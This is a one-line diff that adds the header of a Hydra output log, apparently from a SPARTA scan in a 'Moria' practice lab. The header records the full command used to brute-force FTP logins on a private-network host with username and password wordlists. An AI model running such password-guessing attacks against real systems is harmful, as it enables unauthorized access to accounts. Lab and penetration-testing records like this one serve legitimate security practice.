@@ -1,0 +1,1 @@
+# Hydra v8.6 run at 2017-10-02 16:18:23 on 192.168.2.89 ftp (hydra -s 21 -o /tmp/sparta-_cFVUO-running/hydra/20171002161823-192.168.2.89-21-ftp.txt -L /root/Downloads/Moria/usernames.txt -P /root/Downloads/Moria/passwords.txt -e ns -u -f -V -t 16 192.168.2.89 ftp)
